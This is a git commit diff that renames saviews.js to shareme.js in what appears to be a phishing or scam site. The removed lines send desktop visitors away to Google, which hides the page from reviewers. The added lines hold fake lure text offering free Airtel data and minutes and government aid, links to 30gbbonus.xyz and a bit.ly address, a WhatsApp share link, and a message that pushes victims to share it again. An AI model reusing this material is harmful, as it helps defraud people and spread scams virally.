68994d914c6f9cca4ae8a8b0be0c5652091141a0
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-01-25 04:21:50 -0800

    Update and rename saviews.js to shareme.js

--- saviews.js
+++
@@ -1,4 +0,0 @@
-
-if (typeof window.orientation == "undefined" && screen.width >= 1000){
-        window.location.href="https://www.google.com/";
-}
---
+++ shareme.js
@@ -0,0 +1,9 @@
+
+        var text1 = "*Airtel récompense les clients qui utilisent le réseau depuis 1 an et plus avec 10 Go de données gratuites et 1 000 minutes de conversation gratuites.*%0A%0AVÉRIFIER ICI👇👇%0Ahttps://30gbbonus.xyz/felixoffer.html",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://bit.ly/yhauajjdng",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+
